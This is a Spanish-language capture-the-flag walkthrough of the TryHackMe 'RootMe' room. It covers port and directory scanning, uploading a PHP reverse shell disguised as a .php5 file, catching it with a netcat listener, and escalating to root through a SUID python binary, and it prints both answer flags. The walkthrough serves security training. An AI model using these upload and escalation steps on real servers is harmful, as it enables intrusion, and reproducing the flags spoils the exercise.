
#suid #guid

https://tryhackme.com/r/room/rrootme
### Escaneo
```bash
nmap -Pn -sV --min-rate 1000 10.10.143.185 -vv 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-26 20:30 CDT
NSE: Loaded 46 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 20:30
Completed Parallel DNS resolution of 1 host. at 20:30, 0.01s elapsed
Initiating SYN Stealth Scan at 20:30
Scanning 10.10.143.185 [1000 ports]
Discovered open port 80/tcp on 10.10.143.185
Discovered open port 22/tcp on 10.10.143.185
Completed SYN Stealth Scan at 20:30, 1.53s elapsed (1000 total ports)
Initiating Service scan at 20:30
Scanning 2 services on 10.10.143.185
Completed Service scan at 20:30, 6.95s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.143.185.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 20:30
Completed NSE at 20:30, 1.19s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 20:30
Completed NSE at 20:30, 1.19s elapsed
Nmap scan report for 10.10.143.185
Host is up, received user-set (0.24s latency).
Scanned at 2024-09-26 20:30:45 CDT for 11s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.06 seconds
           Raw packets sent: 1160 (51.040KB) | Rcvd: 1158 (46.328KB)


```

### Task2
```
Scan the machine, how many ports are open?
2

What version of Apache is running?
2.4.29

What service is running on port 22?
ssh


Find directories on the web server using the GoBuster tool.


>> instalamos herramientas
sudo apt install gobuster
sudo apt install seclists
sudo apt install wordlists

>> escaneamos directorios
http://10.10.143.185/panel/
http://10.10.143.185/uploads/


- What is the hidden directory?
/panel/


>> preparamos shell, y lo personalizamos

sudo udatedb
locate php-reverse
/usr/share/laudanum/php/php-reverse-shell.php

cp /usr/share/laudanum/php/php-reverse-shell.php shell.php
cp shell.php shell.php5 

>> lo subimos en y lo vemos en uploads
http://10.10.143.185/panel/


# Index of /uploads

|![[ICO]](http://10.10.143.185/icons/blank.gif)|[Name](http://10.10.143.185/uploads/?C=N;O=D)|[Last modified](http://10.10.143.185/uploads/?C=M;O=A)|[Size](http://10.10.143.185/uploads/?C=S;O=A)|[Description](http://10.10.143.185/uploads/?C=D;O=A)|
|---|---|---|---|---|
|---|   |   |   |   |
|![[PARENTDIR]](http://10.10.143.185/icons/back.gif)|[Parent Directory](http://10.10.143.185/)||-||
|![[   ]](http://10.10.143.185/icons/unknown.gif)|[othershell.php5](http://10.10.143.185/uploads/othershell.php5)|2024-09-27 01:59|5.4K||
|![[   ]](http://10.10.143.185/icons/unknown.gif)|[shell.php5](http://10.10.143.185/uploads/shell.php5)|2024-09-27 01:47|5.4K||
|---|   |   |   |   |

Apache/2.4.29 (Ubuntu) Server at 10.10.143.185 Port 80




>> obtenemos shell
nc -lnvp 1234        
listening on [any] 1234 ...
connect to [10.6.34.162] from (UNKNOWN) [10.10.143.185] 59980
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 01:59:22 up 30 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 


>> spawn tty shell




$ find / -name user.txt 2>/dev/null
/var/www/user.txt
$ cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}






```

### Task 4 Privilege escalation



- Buscar archivos con bit SUID activado, a nivel usuario o a nivel grupo
```

find / -perm /u=s,g=s -user root 2>/dev/null

find / -perm /6000 2>/dev/null




```


```
$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
cd /root
cat roo.txt
cat: roo.txt: No such file or directory
cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}




Find a form to escalate your privileges.


root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```